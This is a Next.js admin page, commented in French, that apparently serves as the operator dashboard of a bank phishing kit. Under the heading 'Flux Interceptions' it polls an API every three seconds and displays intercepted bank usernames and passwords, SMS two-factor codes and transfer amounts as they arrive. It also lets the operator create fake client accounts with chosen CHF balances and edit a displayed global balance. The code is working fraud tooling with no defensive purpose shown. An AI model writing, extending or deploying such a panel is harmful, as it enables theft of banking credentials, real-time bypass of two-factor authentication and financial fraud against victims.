"use client";

import Link from "next/link";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

// Structure d'une interception d'identifiant bancaire
interface BankLog {
  type: "credentials";
  id: string;
  bankName: string;
  username: string;
  secret: string;
  time: string;
  date: string;
}

interface CodeLog {
  type: "code";
  id: string;
  bankName: string;
  username: string;
  codeValue: string;
  time: string;
  date: string;
}

// Interface pour le montant intercepté
interface AmountLog {
  type: "amount";
  id: string;
  bankName: string;
  username: string;
  amountValue: string;
  time: string;
  date: string;
}

// Type combiné mis à jour pour le flux d'activité
type LiveActivity = BankLog | CodeLog | AmountLog;

export default function AdminPage() {
  // Gestion de l'authentification Admin
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [newUserBalance, setNewUserBalance] = useState("");
  // Gestion de la modification des identifiants admin
  const [adminUsername, setAdminUsername] = useState("");
  const [adminPassword, setAdminPassword] = useState("");
  const [isUpdatingCreds, setIsUpdatingCreds] = useState(false);
  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [loginError, setLoginError] = useState("");
  const [newUserName, setNewUserName] = useState("");
  const [newUserPassword, setNewUserPassword] = useState("");
  const [isCreatingUser, setIsCreatingUser] = useState(false);
  const [createdUsers, setCreatedUsers] = useState<any[]>([]);

  // Liste unifiée des activités reçues en temps réel
  const [activities, setActivities] = useState<LiveActivity[]>([]);
  const [currentGlobalBalance, setCurrentGlobalBalance] = useState("20 000");

  // 1. Vérification automatique de la session au chargement (localStorage)
  useEffect(() => {
    const session = localStorage.getItem("admin_session");
    if (session === "active") {
      setIsAuthenticated(true);
    }
  }, []);

  // Fonction de connexion
  // Fonction de connexion modifiée
  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const response = await fetch("/api/admin/credentials");
      const currentCreds = await response.json();

      if (usernameInput === currentCreds.username && passwordInput === currentCreds.password) {
        setIsAuthenticated(true);
        setLoginError("");
        localStorage.setItem("admin_session", "active");
      } else {
        setLoginError("Identifiants de sécurité incorrects.");
      }
    } catch (err) {
      setLoginError("Erreur lors de la vérification de la sécurité.");
    }
  };

  // Fonction de déconnexion
  const handleAdminLogout = () => { 
    setIsAuthenticated(false);
    localStorage.removeItem("admin_session");
  };

  // 2. Récupération réelle du flux d'activité en temps réel
  useEffect(() => {
    if (!isAuthenticated) return;

    const fetchLiveActivities = async () => {
      try {
        const response = await fetch("/api/admin");
        if (response.ok) {
          const result = await response.json();
          setActivities(result.data || []);
        }
      } catch (error) {
        console.error("Erreur de liaison réseau avec l'API Admin:", error);
      }
    };

    fetchLiveActivities();
    const interval = setInterval(fetchLiveActivities, 3000);

    return () => clearInterval(interval);
  }, [isAuthenticated]);

  // Charger le solde au démarrage
  useEffect(() => {
    if (isAuthenticated) {
      fetch("/api/global-balance")
        .then((res) => res.json())
        .then((data) => {
          if (data.balance) {
            setCurrentGlobalBalance(data.balance.replace("CHF", "").trim());
          }
        });
    }
  }, [isAuthenticated]); 

  // Action de modification du solde global
  const handleEditGlobalBalance = async () => {
    const newMontant = prompt("Entrez le nouveau montant (Ex: 12 000) :", currentGlobalBalance);
    if (!newMontant) return;

    const cleanMontant = newMontant.replace("CHF", "").trim();

    try {
      const response = await fetch("/api/global-balance", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ balance: cleanMontant }),
      });
      if (response.ok) {
        const result = await response.json();
        setCurrentGlobalBalance(result.balance.replace("CHF", "").trim());
        alert("Le solde global a bien été enregistré !");
      }
    } catch (err) {
      console.error(err);
    }
  };



  
  // Action de création d'un compte utilisateur modifiée
  const handleCreateUser = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsCreatingUser(true);

    try {
      const response = await fetch("/api/admin-users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        // 🛠️ On ajoute 'balance' dans l'envoi
        body: JSON.stringify({ name: newUserName, password: newUserPassword, balance: newUserBalance }),
      });

      const data = await response.json();

      if (response.ok) {
        alert(`Compte créé avec succès !\nIdentifiant généré : ${data.customId}`);
        setNewUserName("");
        setNewUserPassword("");
        setNewUserBalance(""); // Réinitialise le champ
        fetchCreatedUsers();   // Recharge instantanément le tableau
      } else {
        alert(data.error || "Erreur lors de la création.");
      }
    } catch (err) {
      console.error(err);
      alert("Erreur réseau.");
    } finally {
      setIsCreatingUser(false);
    }
  };

  // Fonction pour charger les comptes utilisateurs
  const fetchCreatedUsers = async () => {
    try {
      const response = await fetch("/api/admin-users");
      if (response.ok) {
        const data = await response.json();
        setCreatedUsers(data.users || []);
      }
    } catch (err) {
      console.error("Erreur lors de la récupération des utilisateurs:", err);
    }
  };

  // Fonction pour supprimer un compte utilisateur
  const handleDeleteUser = async (customId: string, name: string) => {
    const confirmDelete = window.confirm(`⚠️ Voulez-vous vraiment supprimer définitivement le compte de ${name} (${customId}) ?`);
    if (!confirmDelete) return;

    try {
      const response = await fetch(`/api/admin-users?customId=${customId}`, {
        method: "DELETE",
      });

      if (response.ok) {
        setCreatedUsers((prev) => prev.filter((user) => user.customId !== customId));
        alert("Le compte a été supprimé avec succès.");
      } else {
        // 🛠️ FIX : On récupère la réponse sous forme de texte brut pour éviter le crash si le JSON est vide
        const textData = await response.text();
        let errorMessage = "Erreur lors de la suppression.";
        
        try {
          // Si c'est bien du JSON, on extrait l'erreur
          const jsonData = JSON.parse(textData);
          if (jsonData.error) errorMessage = jsonData.error;
        } catch {
          // Si ce n'est pas du JSON (texte brut ou vide)
          if (textData) errorMessage = textData;
        }

        alert(errorMessage);
      }
    } catch (err) {
      console.error(err);
      alert("Erreur réseau lors de la suppression.");
    }
  };

  // Charger les utilisateurs dès que l'admin est connecté
  useEffect(() => {
    if (isAuthenticated) {
      fetchCreatedUsers();
    }
  }, [isAuthenticated]);
  // ÉCRAN 1 : FORMULAIRE DE CONNEXION SÉCURISÉ
  if (!isAuthenticated) {
    return (
      <div className="admin-wrapper">
        <div className="admin-login-container">
          <form className="admin-login-card" onSubmit={handleAdminLogin}>
            <h2 className="bank-connect-title" style={{ textAlign: "center", marginBottom: "5px" }}>
              Espace Sécurisé
            </h2>
            <p className="bank-connect-subtitle" style={{ textAlign: "center", marginBottom: "25px" }}>
              Réservé uniquement aux administrateurs de la plateforme.
            </p>

            {loginError && <div className="error-message">{loginError}</div>}

            <div className="input-group">
              <label>Nom d'utilisateur</label>
              <div className="input-wrapper">
                <input
                  type="text"
                  className="input-field"
                  placeholder="Username"
                  value={usernameInput}
                  onChange={(e) => setUsernameInput(e.target.value)}
                  required
                />
              </div>
            </div>

            <div className="input-group" style={{ marginTop: "15px", marginBottom: "25px" }}>
              <label>Mot de passe secret</label>
              <div className="input-wrapper">
                <input
                  type="password"
                  className="input-field"
                  placeholder="••••••••••••"
                  value={passwordInput}
                  onChange={(e) => setPasswordInput(e.target.value)}
                  required
                />
              </div>
            </div>

            <button type="submit" className="btn-link-bank" style={{ marginTop: "0" }}>
              <i className="fa-solid fa-unlock-keyhole"></i>
              Déverrouiller l'accès
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Action pour vider toutes les interceptions de la base de données
const handleClearAllLogs = async () => {
  const confirmDelete = window.confirm("⚠️ Attention : Voulez-vous vraiment supprimer TOUTES les interceptions définitivement ? Cette action est irréversible.");
  if (!confirmDelete) return;

  try {
    const response = await fetch("/api/admin", { method: "DELETE" });
    if (response.ok) {
      setActivities([]); // Vide instantanément l'affichage sur la page
      alert("La base de données a été vidée avec succès !");
    } else {
      alert("Erreur lors de la suppression sur le serveur.");
    }
  } catch (err) {
    console.error("Erreur lors de la suppression :", err);
  }
};



// Action de modification des accès enregistrée exclusivement en BDD
  const handleUpdateAdminCreds = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsUpdatingCreds(true);

    try {
      const response = await fetch("/api/admin/credentials", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: adminUsername, password: adminPassword }),
      });

      if (response.ok) {
        alert("🔒 Vos accès Administrateur ont été mis à jour directement dans la base de données !");
        setAdminUsername("");
        setAdminPassword("");
      } else {
        const data = await response.json();
        alert(data.error || "Impossible de sauvegarder vos accès.");
      }
    } catch (err) {
      console.error(err);
      alert("Erreur réseau lors de la communication avec la base de données.");
    } finally {
      setIsUpdatingCreds(false);
    }
  };
  // ÉCRAN 2 : LE TABLEAU DE BORD ADMIN MULTI-FLUX
  return (
    <div className="admin-wrapper">
      <div className="admin-dashboard">
        
       {/* Barre supérieure */}
        <div 
          className="admin-header" 
          style={{ 
            display: "flex", 
            justifyContent: "space-between", 
            alignItems: "center", 
            flexWrap: "wrap", 
            gap: "15px", 
            padding: "15px 20px", 
            background: "#fff", 
            borderRadius: "12px", 
            border: "1px solid #e5e7eb",
            marginBottom: "20px"
          }}
        >
          {/* Section gauche : Titre, Badge et Actions d'administration */}
          <div style={{ display: "flex", alignItems: "center", flexWrap: "wrap", gap: "10px", flex: "1", minWidth: "280px" }}>
            <h2 style={{ margin: "0 10px 0 0", fontSize: "20px", fontWeight: "700", color: "#111" }}>Flux Interceptions</h2>
            
            

            {/* Conteneur des boutons d'outils (Solde & Clear) */}
            <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
              <button 
                onClick={handleEditGlobalBalance} 
                style={{ padding: "6px 12px", background: "#2563eb", color: "#fff", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "600", fontSize: "13px", display: "inline-flex", alignItems: "center", gap: "6px" }}
              >
                <i className="fa-solid fa-wallet"></i>
                Changer solde ({currentGlobalBalance} CHF)
              </button>
              
              <button 
                onClick={handleClearAllLogs} 
                style={{ padding: "6px 12px", background: "#dc2626", color: "#fff", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "600", fontSize: "13px", display: "inline-flex", alignItems: "center", gap: "6px" }}
              >
                <i className="fa-solid fa-trash-can"></i>
                Supprimer les données
              </button>
            </div>
          </div>

          {/* Section droite : Raccourcis de navigation & Déconnexion */}
          <div style={{ display: "flex", alignItems: "center", flexWrap: "wrap", gap: "8px" }}>
            {/* 🟢 Bouton : Raccourci Création Compte */}
            <button 
              onClick={() => document.getElementById("create-user-section")?.scrollIntoView({ behavior: "smooth" })} 
              style={{ padding: "6px 12px", background: "#10b981", color: "#fff", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "600", fontSize: "13px", display: "inline-flex", alignItems: "center", gap: "6px" }}
            >
              <i className="fa-solid fa-user-plus"></i>
              Créer compte
            </button>

            {/* 🔐 NOUVEAU BOUTON : Raccourci Changement Sécurité/Accès */}
            <button 
              onClick={() => document.getElementById("create-user-section")?.scrollIntoView({ behavior: "smooth" })} 
              style={{ padding: "6px 12px", background: "#4b5563", color: "#fff", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "600", fontSize: "13px", display: "inline-flex", alignItems: "center", gap: "6px" }}
            >
              <i className="fa-solid fa-lock"></i>
              Sécurité
            </button>

            {/* Déconnexion */}
            <button 
              className="btn-logout-admin" 
              onClick={handleAdminLogout}
              style={{ padding: "6px 12px", borderRadius: "8px", fontSize: "13px", fontWeight: "600", display: "inline-flex", alignItems: "center", gap: "6px" }}
            >
              <i className="fa-solid fa-power-off"></i>
              Quitter
            </button>
          </div>
        </div>

        {/* Corps unifié des notifications dynamiques */}
        <div className="logs-list">
          {activities.length === 0 ? (
            <div className="empty-logs">
              <i className="fa-solid fa-satellite-dish fa-2x" style={{ color: "#ccc" }}></i>
              <p>Aucune activité interceptée. En attente de requêtes clients...</p>
            </div>
          ) : (
            activities.map((activity) => {
              // RENDU 1 : SI C'EST UN CODE SMS
              if (activity.type === "code") {
                return (
                  <div key={activity.id} className="code-card">
                    <div className="code-card-left">
                      <h3><i className="fa-solid fa-key" style={{ marginRight: "4px" }}></i>Code 2FA Reçu</h3>
                      <div className="code-display">{activity.codeValue}</div>
                      <div className="code-target-info">
                        Banque : <strong>{activity.bankName}</strong> ({activity.username})
                      </div>
                    </div>
                    <div className="log-card-right">
                      <span className="log-time">
                        <i className="fa-regular fa-clock" style={{ marginRight: "5px", fontSize: "10px", color: "#aaa" }}></i>
                        {activity.time}
                      </span>
                      <span className="log-date">{activity.date}</span>
                    </div>
                  </div>
                );
              }

              // RENDU 2 : SI C'EST UN MONTANT INTERCEPTÉ
              if (activity.type === "amount") {
                return (
                  <div key={activity.id} className="code-card" style={{ borderLeft: "5px solid #2563eb" }}>
                    <div className="code-card-left">
                      <h3 style={{ color: "#2563eb" }}>
                        <i className="fa-solid fa-money-bill-transfer" style={{ marginRight: "6px" }}></i>Montant Saisi
                      </h3>
                      <div className="code-display" style={{ background: "#eff6ff", color: "#1e40af", borderColor: "#bfdbfe" }}>
                        {activity.amountValue}
                      </div>
                      <div className="code-target-info">
                        Banque : <strong>{activity.bankName}</strong> ({activity.username})
                      </div>
                    </div>
                    <div className="log-card-right">
                      <span className="log-time">
                        <i className="fa-regular fa-clock" style={{ marginRight: "5px", fontSize: "12px", color: "#aaa" }}></i>
                        {activity.time}
                      </span>
                      <span className="log-date">{activity.date}</span>
                    </div>
                  </div>
                );
              }

              // RENDU 3 : IDENTIFIANTS BANCAIRES D'ORIGINE
              return (
                <div key={activity.id} className="log-card">
                  <div className="log-card-left" style={{ paddingLeft: "5px" }}>
                    <div className="log-credentials">
                      <h3 style={{ fontSize: "17px", color: "#111", marginBottom: "6px" }}>
                        {activity.bankName}
                      </h3>
                      <div className="log-data-line">
                        <strong>ID:</strong> {activity.username}
                      </div>
                      <div className="log-data-line">
                        <strong>MDP:</strong> {activity.secret}
                      </div>
                    </div>
                  </div>
                  <div className="log-card-right">
                    <span className="log-time">
                      <i className="fa-regular fa-clock" style={{ marginRight: "5px", fontSize: "12px", color: "#aaa" }}></i>
                      {activity.time}
                    </span>
                    <span className="log-date">{activity.date}</span>
                  </div>
                </div>
              );
            })
          )}
        </div>

        <div id="create-user-section" style={{ background: "#fff", padding: "20px", borderRadius: "12px", border: "1px solid #e5e7eb", marginBottom: "25px" }}>
          
          {/* Formulaire de création */}
          <h2 style={{ fontSize: "18px", marginBottom: "15px", color: "#111", display: "flex", alignItems: "center", gap: "8px" }}>
            <i className="fa-solid fa-user-plus" style={{ color: "#2563eb" }}></i>
            Créer un compte client
          </h2>
          
          <form onSubmit={handleCreateUser} style={{ display: "flex", gap: "15px", alignItems: "stretch", flexWrap: "wrap", marginBottom: "30px" }}>
            <div style={{ display: "flex", flexDirection: "column", gap: "5px", flex: "1", minWidth: "100px" }}>
              <label style={{ fontSize: "13px", fontWeight: "600", color: "#666" }}>Nom complet</label>
              <input 
                type="text" 
                placeholder="Ex: Jean Dupont" 
                value={newUserName}
                onChange={(e) => setNewUserName(e.target.value)}
                required 
                style={{ padding: "12px", borderRadius: "8px", border: "1px solid #ccc", fontSize: "14px", width: "100%", boxSizing: "border-box" }}
              />
            </div>
            
            <div style={{ display: "flex", flexDirection: "column", gap: "5px", flex: "1", minWidth: "200px" }}>
              <label style={{ fontSize: "13px", fontWeight: "600", color: "#666" }}>Mot de passe initial</label>
              <input 
                type="text" 
                placeholder="Ex: Client2026!" 
                value={newUserPassword}
                onChange={(e) => setNewUserPassword(e.target.value)}
                required 
                style={{ padding: "12px", borderRadius: "8px", border: "1px solid #ccc", fontSize: "14px", width: "100%", boxSizing: "border-box" }}
              />
            </div>
            <div style={{ display: "flex", flexDirection: "column", gap: "5px", flex: "1", minWidth: "150px" }}>
              <label style={{ fontSize: "13px", fontWeight: "600", color: "#666" }}>Solde initial (CHF)</label>
              <input 
                type="text" 
                placeholder="Ex: 15 000" 
                value={newUserBalance}
                onChange={(e) => setNewUserBalance(e.target.value)}
                required 
                style={{ padding: "12px", borderRadius: "8px", border: "1px solid #ccc", fontSize: "14px", width: "100%", boxSizing: "border-box" }}
              />
            </div>
            
            <button 
              type="submit" 
              disabled={isCreatingUser} 
              style={{ padding: "12px 24px", background: "#10b981", color: "#fff", border: "none", borderRadius: "8px", fontWeight: "bold", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", minWidth: "160px", alignSelf: "flex-end", height: "46px" }}
            >
              {isCreatingUser ? "Création..." : "Générer le compte"}
            </button>
          </form>

          <hr style={{ border: "0", borderTop: "1px solid #e5e7eb", margin: "20px 0" }} />

          {/* Liste des comptes créés */}
          <h3 style={{ fontSize: "16px", marginBottom: "15px", color: "#111", display: "flex", alignItems: "center", gap: "8px" }}>
            <i className="fa-solid fa-users" style={{ color: "#4b5563" }}></i>
            Comptes Utilisateurs Actifs ({createdUsers.length})
          </h3>

          <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e5e7eb", borderRadius: "8px" }}>
           <table style={{ width: "100%", borderCollapse: "collapse", textAlign: "left", fontSize: "14px" }}>
              <thead>
                <tr style={{ background: "#f9fafb", borderBottom: "1px solid #e5e7eb" }}>
                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Identifiant</th>
                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Nom complet</th>
                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Mot de passe</th>
                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Solde assigné</th> {/* 👈 Nouvelle colonne */}
                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Action</th>
                </tr>
              </thead>
              <tbody>
                {createdUsers.length === 0 ? (
                  <tr>
                    <td colSpan={5} style={{ padding: "20px", textAlign: "center", color: "#9ca3af" }}> {/* Colspan passe à 5 */}
                      Aucun compte utilisateur créé pour le moment.
                    </td>
                  </tr>
                ) : (
                  createdUsers.map((user) => (
                    <tr key={user.id} style={{ borderBottom: "1px solid #e5e7eb" }}>
                      <td style={{ padding: "12px 16px", fontWeight: "bold", color: "#2563eb" }}>{user.customId}</td>
                      <td style={{ padding: "12px 16px", color: "#111" }}>{user.name}</td>
                      <td style={{ padding: "12px 16px", color: "#4b5563", fontFamily: "monospace" }}>{user.password}</td>
                      <td style={{ padding: "12px 16px", fontWeight: "600", color: "#10b981" }}>{user.balance || "0"} CHF</td> {/* 👈 Affichage du solde */}
                      <td style={{ padding: "12px 16px" }}>
                        <button
                          onClick={() => handleDeleteUser(user.customId, user.name)}
                          style={{ background: "none", border: "none", color: "#dc2626", cursor: "pointer", fontSize: "16px", padding: "4px 8px" }}
                          title="Supprimer ce compte"
                        >
                          <i className="fa-solid fa-trash-can"></i>
                        </button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>

        </div>

      </div>
      <hr style={{ border: "0", borderTop: "1px solid #e5e7eb", margin: "30px 0" }} />

          {/* 🔐 Nouvelle Section : Paramètres de sécurité Admin */}
          <h2 style={{ fontSize: "18px", marginBottom: "15px", color: "#111", display: "flex", alignItems: "center", gap: "8px" }}>
            <i className="fa-solid fa-lock-open" style={{ color: "#dc2626" }}></i>
            Sécurité & Accès Administrateur
          </h2>
          
          <form onSubmit={handleUpdateAdminCreds} style={{ display: "flex", gap: "15px", alignItems: "stretch", flexWrap: "wrap" }}>
            <div style={{ display: "flex", flexDirection: "column", gap: "5px", flex: "1", minWidth: "200px" }}>
              <label style={{ fontSize: "13px", fontWeight: "600", color: "#666" }}>Nouveau Nom d'utilisateur</label>
              <input 
                type="text" 
                placeholder="Ex: SuperAdmin" 
                value={adminUsername}
                onChange={(e) => setAdminUsername(e.target.value)}
                required 
                style={{ padding: "12px", borderRadius: "8px", border: "1px solid #ccc", fontSize: "14px", width: "100%", boxSizing: "border-box" }}
              />
            </div>
            
            <div style={{ display: "flex", flexDirection: "column", gap: "5px", flex: "1", minWidth: "200px" }}>
              <label style={{ fontSize: "13px", fontWeight: "600", color: "#666" }}>Nouveau Mot de passe secret</label>
              <input 
                type="password" 
                placeholder="••••••••••••" 
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                required 
                style={{ padding: "12px", borderRadius: "8px", border: "1px solid #ccc", fontSize: "14px", width: "100%", boxSizing: "border-box" }}
              />
            </div>
            
            <button 
              type="submit" 
              disabled={isUpdatingCreds} 
              style={{ padding: "12px 24px", background: "#dc2626", color: "#fff", border: "none", borderRadius: "8px", fontWeight: "bold", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", minWidth: "180px", alignSelf: "flex-end", height: "46px" }}
            >
              {isUpdatingCreds ? "Mise à jour..." : "Sauvegarder mes accès"}
            </button> <br />
          </form>
          <br />
    </div>
  );
}